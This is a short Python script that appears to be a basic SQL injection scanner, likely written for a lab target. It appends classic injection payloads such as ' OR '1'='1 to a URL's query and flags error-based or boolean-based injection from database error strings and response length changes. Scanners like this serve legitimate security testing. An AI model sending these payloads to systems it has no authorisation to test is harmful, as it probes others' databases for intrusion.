import requests

PAYLOADS = ["'", "' OR '1'='1", "' OR 1=1--"]

ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "sql syntax",
    "mysqli_",
]

def detect_sqli(url, cookies=None):
    vulnerabilities = []

    if 'Submit' not in url:
        url = url + '&Submit=Submit'

    try:
        baseline = requests.get(url, cookies=cookies, timeout=5)
        baseline_length = len(baseline.text)
        baseline_text = baseline.text.lower()
    except:
        return vulnerabilities

    for payload in PAYLOADS:
        parts = url.split('&Submit=Submit')
        test_url = parts[0] + payload + '&Submit=Submit'

        try:
            response = requests.get(test_url, cookies=cookies, timeout=5)
            response_text = response.text.lower()
            response_length = len(response.text)

            for signature in ERROR_SIGNATURES:
                if signature in response_text and signature not in baseline_text:
                    vulnerabilities.append({
                        'type': 'SQL Injection (Error-Based)',
                        'severity': 'High',
                        'description': 'Payload ' + payload + ' triggered error: ' + signature
                    })
                    break

            length_diff = response_length - baseline_length
            if length_diff > 100:
                vulnerabilities.append({
                    'type': 'SQL Injection (Boolean-Based)',
                    'severity': 'High',
                    'description': 'Payload ' + payload + ' changed response by ' + str(length_diff) + ' bytes - database returned extra rows'
                })

        except Exception as e:
            pass

    return vulnerabilities